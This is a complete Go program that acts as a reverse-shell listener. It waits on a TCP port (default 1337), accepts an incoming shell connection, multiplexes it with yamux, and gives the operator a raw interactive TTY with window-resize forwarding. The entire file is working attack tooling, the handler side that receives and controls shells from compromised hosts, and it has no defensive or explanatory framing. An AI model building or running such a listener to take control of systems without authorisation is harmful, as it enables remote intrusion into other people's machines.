package main

import (
	"encoding/gob"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"syscall"

	"github.com/jessevdk/go-flags"
	"github.com/hashicorp/yamux"
	"golang.org/x/crypto/ssh/terminal"
)

type options struct {
	Port int `short:"p" long:"port" description:"Port to listen on" default:"1337"`
}

func main() {
	// parse command line args
	opts := parseArgs()

	// make terminal raw for a fully-interactive TTY shell and restore it on exit
	stdInInt := int(os.Stdin.Fd())
	prevState, err := terminal.MakeRaw(stdInInt)
	defer terminal.Restore(stdInInt, prevState)
	logIfErr("Raw PTY", err)
	
	// start rev shell listener on tcp:port
	listenTcpShell(opts.Port)
}

func listenTcpShell(port int) {
	// start listener
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	fatalIfErr("Listen", err)
	fmt.Printf("[*] Listening on port %d\n", port)
	
	// accept and handle connection
	conn, err := listener.Accept()
	if err != nil {
		logIfErr("Accept", err)
	} else {
		fmt.Printf("[*] Connected to %s\n\n", conn.RemoteAddr().String())
		// handleSimpleConnection(conn)
		handleMuxConnection(conn)
	}
}

func handleSimpleConnection(conn net.Conn) {
	defer conn.Close()

	// redirect IO to socket
	done := make(chan struct{})
	go func(){ io.Copy(conn, os.Stdin); done<-struct{}{} }() // write stdin to socket
	go func(){ io.Copy(os.Stdout, conn); done<-struct{}{} }() // read stdout from socket
	<-done
}

func handleMuxConnection(conn net.Conn) {
	// create a mux session over this connection
	session, err := yamux.Server(conn, nil)
	fatalIfErr("Session", err)
	defer session.Close() // closes all streams and conn
	
	// any message pushed to done will be used to return later
	done := make(chan struct{})

	// stream for shell IO
	ioStream, err := session.Accept()
	fatalIfErr("Stream IO", err)
	go func(){ io.Copy(ioStream, os.Stdin); done<-struct{}{} }() // write stdin to socket
	go func(){ io.Copy(os.Stdout, ioStream); done<-struct{}{} }() // read stdout from socket
	ioStream.Write([]byte("\n")) // send new line ([enter]) to fix text alignment

	// stream for resizing window
	resizeStream, err := session.Accept()
	fatalIfErr("Stream resize", err)
	streamResize(resizeStream);

	// wait for any message to return
	<-done
}

func streamResize(stream net.Conn) {
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		encoder := gob.NewEncoder(stream)
		for range ch {
			// get current size
			width, height, err := terminal.GetSize(int(os.Stdin.Fd()))
			if err != nil {
				// skip streaming size
				logErr("Get size", err)
				continue
			}
			
			// stream size
			size := struct{Width, Height int}{width, height}
			err = encoder.Encode(size)
			logIfErr("Send size", err)
		}
	}()
	ch <- syscall.SIGWINCH
}

func parseArgs() (options) {
	var opts options
	if _, err := flags.Parse(&opts); err != nil {
		/* 
		passing help flag in args prints help and also throws ErrHelp
		if error type is ErrHelp, omit second print and exit cleanly
		everything else log and exit with error
		*/
		switch flagsErrPtr := err.(type) {
		case *flags.Error:
			flagsErrType := (*flagsErrPtr).Type
			if flagsErrType == flags.ErrHelp {
				os.Exit(0)
			}
			fatalIfErr(flagsErrType.String(), err)
		default:
			fatalIfErr("Args", err)
		}
	}
	return opts
}

func fatalIfErr(context string, err error) {
	if err != nil {
		log.Fatalf("[!] %s -> %s\n", context, err)
	}
}

func logIfErr(context string, err error) {
	if err != nil {
		logErr(context, err)
	}
}

func logErr(context string, err error) {
	log.Printf("[!] %s -> %s\n", context, err)
}